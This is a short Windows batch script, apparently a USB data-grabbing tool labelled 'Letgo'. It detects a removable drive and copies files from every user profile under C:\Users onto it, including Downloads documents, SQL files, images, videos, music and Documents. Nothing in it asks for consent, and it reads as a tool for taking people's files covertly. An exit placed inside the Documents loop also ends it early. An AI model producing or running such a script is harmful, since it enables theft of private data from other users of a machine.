@echo off

for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (

if %%l equ 2 (
set usbname=%%i
        )
        )

for %%f in (pictures downloads video music documents) do mkdir %usbname%\%%f
cd C:\Users
echo "-----------------Start Letgo------------------------"
for /d /r %%i in ("\*") do (
for %%d in (%%i\Downloads\*.png %%i\Downloads\*.gif %%i\Downloads\*.txt %%i\Downloads\*.pdf %%i\Downloads\*.docx %%i\Downloads\*.sql %%i\Downloads\*.pptx %%i\Downloads\*.jpg %%i\Downloads\*.jpeg) do ( 
echo %%d
copy %%d %usbname%\downloads 
)

for %%v in (%%i\Videos\*) do ( 
echo %%v 
copy %%v %usbname%\video )

for %%p in (%%i\Pictures\*) do ( 
echo %%p
copy %%p %usbname%\pictures
)

for %%m in (%%i\Music\*) do ( 
echo %%m
copy %%m %usbname%\music 
)

for %%z in (%%i\Documents\*) do ( 
echo %%z
copy %%z %usbname%\documents 
echo "---------------------end-----------------------------"
exit
)
)

pause